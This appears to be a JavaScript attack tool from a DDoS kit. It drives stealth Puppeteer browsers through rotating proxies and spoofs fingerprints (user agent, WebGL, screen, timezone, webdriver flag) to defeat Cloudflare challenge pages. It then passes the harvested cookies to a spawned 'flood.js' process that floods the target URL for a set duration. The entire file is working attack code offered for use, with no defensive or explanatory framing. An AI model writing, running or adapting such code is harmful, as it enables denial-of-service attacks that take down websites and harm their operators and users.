const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");

const COOKIES_MAX_RETRIES = 1;
const errorHandler = error => {
    console.log(error);
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

async function spoofFingerprint(page, userAgent) {
    const possibleLanguages = [
        ['en-US', 'en'],
        ['vi-VN', 'vi'],
        ['en-GB', 'en']
    ];
    const languages = possibleLanguages[Math.floor(Math.random() * possibleLanguages.length)];

    const hardwareConcurrency = [4, 6, 8][Math.floor(Math.random() * 3)];

    const deviceMemory = [4, 6, 8][Math.floor(Math.random() * 3)];

    const possibleRenderers = [
        'ANGLE (Qualcomm, Adreno (TM) 618, OpenGL ES 3.2)',
        'ANGLE (Qualcomm, Adreno (TM) 650, OpenGL ES 3.2)',
        'ANGLE (Qualcomm, Adreno (TM) 730, OpenGL ES 3.2)',
        'ANGLE (ARM, Mali-G77, OpenGL ES 3.2)',
        'ANGLE (ARM, Mali-G710, OpenGL ES 3.2)'
    ];
    const renderer = possibleRenderers[Math.floor(Math.random() * possibleRenderers.length)];

    const possibleDepths = [24, 32];
    const depth = possibleDepths[Math.floor(Math.random() * possibleDepths.length)];

    const possibleTimezones = [
        'Asia/Ho_Chi_Minh',
        'America/New_York',
        'Europe/London',
        'Asia/Tokyo',
        'Australia/Sydney'
    ];
    const timeZone = possibleTimezones[Math.floor(Math.random() * possibleTimezones.length)];

    // Mobile screen resolutions
    const possibleScreens = [
        { width: 393, height: 851, availWidth: 393, availHeight: 851 },
        { width: 360, height: 800, availWidth: 360, availHeight: 800 },
        { width: 412, height: 915, availWidth: 412, availHeight: 915 },
        { width: 430, height: 932, availWidth: 430, availHeight: 932 }
    ];
    const screen = possibleScreens[Math.floor(Math.random() * possibleScreens.length)];

    await page.evaluateOnNewDocument((ua, langs, hw, mem, rend, dep, tz, screenRes) => {
        // Spoof screen resolution - mobile Android
        Object.defineProperty(window, 'screen', {
            value: {
                width: screenRes.width,
                height: screenRes.height,
                availWidth: screenRes.availWidth,
                availHeight: screenRes.availHeight,
                colorDepth: dep,
                pixelDepth: dep
            },
            writable: false
        });

        // Spoof user agent
        Object.defineProperty(navigator, 'userAgent', {
            value: ua,
            writable: false
        });

        // Spoof languages
        Object.defineProperty(navigator, 'languages', { value: langs, writable: false });
        Object.defineProperty(navigator, 'language', { value: langs[0], writable: false });

        // Spoof webdriver
        Object.defineProperty(navigator, 'webdriver', { get: () => false, writable: false });

        // Spoof hardware concurrency
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: hw, writable: false });

        // Spoof device memory
        Object.defineProperty(navigator, 'deviceMemory', { value: mem, writable: false });

        // Spoof max touch points - Android standard
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5, writable: false });

        // Spoof WebGL - minimal
        const getContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type, ...args) {
            if (type === 'webgl' || type === 'experimental-webgl') {
                const ctx = getContext.call(this, type, ...args);
                if (ctx) {
                    const getParameter = ctx.getParameter.bind(ctx);
                    ctx.getParameter = function(parameter) {
                        if (parameter === 37445) { // VENDOR
                            return 'Google Inc. (Qualcomm)';
                        } else if (parameter === 37446) { // RENDERER
                            return rend;
                        }
                        return getParameter(parameter);
                    };
                }
                return ctx;
            }
            return getContext.call(this, type, ...args);
        };

        // Spoof timezone
        const originalResolvedOptions = Intl.DateTimeFormat.prototype.resolvedOptions;
        Intl.DateTimeFormat.prototype.resolvedOptions = function() {
            const options = originalResolvedOptions.call(this);
            options.timeZone = tz;
            return options;
        };
    }, userAgent, languages, hardwareConcurrency, deviceMemory, renderer, depth, timeZone, screen);
}

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
if (process.argv.length < 7) {
    console.error("node browser target thread proxy rate time");
    process.exit(1);
}
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = parseInt(process.argv[6]);

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const { spawn } = require("child_process");

const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/);
        return proxies;
    } catch (error) {
        console.error('Error reading proxies file:', error);
        return [];
    }
};

let proxies = readProxiesFromFile(proxyFile);

const userAgents = [
  "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.208 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-S23 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/140.0.7339.208 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; ONEPLUS A6010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.8743.92 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 EdgA/138.0.0.0",
  "Mozilla/5.0 (Linux; Android 15; Redmi K60) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.208 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.208 Mobile Safari/537.36 EdgA/140.0.7339.208",
  "Mozilla/5.0 (Linux; Android 14; Moto G Power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/137.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel Fold) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.208 Mobile Safari/537.36"
];

async function detectChallenge(browser, page, browserProxy) {
    const title = await page.title();
    const content = await page.content();
    let challengeDetected = false;
  
    if (title === "Attention Required! | Cloudflare") {
        throw new Error("Proxy blocked");
    }
  
    if (content.includes("challenge-platform")) {
        challengeDetected = true;
        console.log("(BROWSER) Start Bypass Proxy: " + browserProxy);
    
        try {
            await sleep(25);
            const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
            await captchaContainer.click({ offset: { x: 30, y: 30 } });
        } catch (error) {
            // Handle any errors
        } finally {
            await sleep(10);
            return challengeDetected;
        }
    }
  
    console.log("(BROWSER) No challenge detected " + browserProxy);
    await sleep(5);
    return challengeDetected;
}

async function openBrowser(targetURL, browserProxy, tabId) {
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const options = {
        headless: "new",
        ignoreHTTPSErrors: true,
        args: [
            "--proxy-server=http://" + browserProxy,
            "--no-sandbox",
            "--no-first-run",
            "--ignore-certificate-errors",
            "--disable-extensions",
            "--test-type",
            "--user-agent=" + userAgent,
            "--disable-gpu",
            "--disable-browser-side-navigation",
            "--disable-blink-features=AutomationControlled",
            "--disable-dev-shm-usage",
            "--disable-features=site-per-process",
            "--disable-advertisements",
            "--enable-webgl",
            "--disable-images",
        ]
    };

    let browser;
    let errorMsg = null;
    try {
        browser = await puppeteer.launch(options);
    } catch (error) {
        errorMsg = error.message;
        return null;
    }
  
    try {
        const [page] = await browser.pages();
        const client = page._client();
    
        await spoofFingerprint(page, userAgent);
    
        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id });
            }
        });
    
        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: "networkidle0" });
        const challengeDetected = await detectChallenge(browser, page, browserProxy);
        let status = 'Unknown';
        
        if (challengeDetected) {
            const finalResponse = await page.goto(targetURL, { waitUntil: "networkidle0" });
            status = finalResponse ? finalResponse.status() : 'Unknown';
        } else {
            const initialResponse = await page.reload({ waitUntil: "networkidle0" });
            status = initialResponse ? initialResponse.status() : 'Unknown';
        }
        
        const title = await page.title();
        if (title === "Just a moment..." || title === "Checking your browser before accessing") {
            throw new Error("Challenge persists");
        }
        const cookies = await page.cookies(targetURL);
    
        return {
            title: title,
            browserProxy: browserProxy,
            cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
            userAgent: userAgent,
            status: status
        };
    } catch (error) {
        errorMsg = error.message;
        return null;
    } finally {
        if (browser) {
            const closePromise = browser.close();
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('Browser close timeout')), 3000)
            );
            try {
                await Promise.race([closePromise, timeoutPromise]);
            } catch (closeError) {
                if (browser.process && !browser.process.killed) {
                    browser.process.kill('SIGKILL');
                }
            }
        }
    }
}

async function startThread(targetURL, browserProxy, tabId) {
    for (let attempt = 0; attempt <= COOKIES_MAX_RETRIES; attempt++) {
        const response = await openBrowser(targetURL, browserProxy, tabId);

        if (response) {
            if (response.title === "Just a moment...") {
                return { success: false, proxy: browserProxy };
            }
            
            console.error(`(title): ${response.title}`);
            console.error(`(status): ${response.status}`);
            console.error(`(proxy): ${response.browserProxy} `);
            console.error(`(userAgent): ${response.userAgent}`);
            console.error(`(cookie): ${response.cookies}`);

            // Fix: Đổi thành "flood-3.js" và thêm --debug + pipe output
            const args = [
              "flood.js",  // <-- Đổi từ "flood11" để match file bạn có
              targetURL,
              duration.toString(),
              "1",
              rates,
              response.browserProxy,
              response.cookies,
              response.userAgent,
              "--full",
            ];
            const floodProcess = spawn("node", args);
            
            // THÊM PHẦN NÀY: Pipe stdout/stderr ra console để thấy debug flood
            floodProcess.stdout.on('data', (data) => {
                console.log(`[FLOOD ${browserProxy}] ${data.toString().trim()}`);
            });
            floodProcess.stderr.on('data', (data) => {
                console.error(`[FLOOD ERROR ${browserProxy}] ${data.toString().trim()}`);
            });
            floodProcess.on('close', (code) => {
                console.log(`[FLOOD ${browserProxy}] Closed with code ${code}`);
            });
            
            return { success: true, response, proxy: browserProxy };
        }
    }
    return { success: false, proxy: browserProxy };
}

async function processBatch(targetURL, batchProxies) {
    const promises = [];
    for (let index = 0; index < batchProxies.length; index++) {
        const browserProxy = batchProxies[index];
        const tabId = 1 + index;
        promises.push(startThread(targetURL, browserProxy, tabId));
    }
    await Promise.allSettled(promises);
    // No return needed since we discard all processed proxies regardless of success
}

const { exec } = require('child_process');

async function main() {
    const batchSize = threads;
    const startTime = Date.now();
    let cycle = 0;

    while (true) {
        if (Date.now() - startTime >= duration * 1000) break;
        cycle++;
        console.log(`Starting cycle ${cycle}`);

        for (let i = 0; i < proxies.length; i += batchSize) {
            if (Date.now() - startTime >= duration * 1000) break;
            const batch = proxies.slice(i, i + batchSize);
            await processBatch(targetURL, batch);
        }
    }

    console.log("Time up, killing processes...");

    exec('pkill -f flood.js', (err) => {
        if (err) console.error('error pkill flood:', err.message);
    });

    exec('pkill -f Chrome', (err) => {
        if (err) console.error('error pkill Chrome:', err.message);
    });

    process.exit();
}

console.log("Running...");
main();